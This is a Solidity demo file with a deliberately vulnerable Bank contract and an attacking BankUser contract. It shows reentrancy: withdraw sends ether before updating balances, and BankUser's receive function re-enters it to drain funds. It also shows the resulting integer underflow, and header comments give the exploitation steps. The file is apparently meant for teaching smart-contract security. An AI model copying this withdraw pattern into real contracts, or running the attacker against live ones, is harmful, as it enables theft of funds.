// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

/* A demo contract with reentrancy and integer overflow bug
 * Run the test as follow:
 * 1) create Bank with account A and send it 4 wei
 * 2) create BankUser with account B
 * 3) run BankUser.setup(bankAddress)
 * 4) run BankUser.deposit() with 2 wei
 * 5) run BankUser.withdraw(1 wei)
 * 6) check BankUser.balance, Bank.balance, Bank.balances[BankUserAddress]
 */

contract Bank {
    mapping (address => uint256) public balances;
    
    constructor() public payable {
        balances[msg.sender] = msg.value;
    }
    
    function deposit() public payable {
        require(balances[msg.sender] + msg.value >= balances[msg.sender]);
        balances[msg.sender] += msg.value;
    }
    
    function withdraw(uint amount) public {
        require(balances[msg.sender] >= amount, "Withdrawal amount too large");

        // use fallback function to send amount as send and transfer use 2300 gas
        // https://solidity.readthedocs.io/en/v0.6.1/units-and-global-variables.html#members-of-address-types
        (bool success, ) = msg.sender.call{value:amount}("");
        require(success, "fail to send amount");
        balances[msg.sender] -= amount;
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}


contract BankUser {
    uint public count;
    uint public max = 5;
    uint public defaultWithdrawalAmount = 1 wei;
    Bank bank;
    event logGas(uint);

    function setCount(uint newCount) public {
        count = newCount;
    }
    
    function setMax( uint newMax ) public {
        max = newMax;
    }
    
    function setAmount(uint amount) public {
        defaultWithdrawalAmount = amount;
    }
    
    receive() external payable {
        if( count < max) {
            count++;
            bank.withdraw(defaultWithdrawalAmount);
        } else {
            count = 0; // reset to 0 for next round of withdrawal
        }
    }
    
    function setup(address bankAddress) public {
        bank = Bank(bankAddress);
    }
    
    function deposit() public payable {
        bank.deposit{value:msg.value}();
    }
    
    function withdraw(uint amount) public {
        bank.withdraw(amount);
    }
    
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
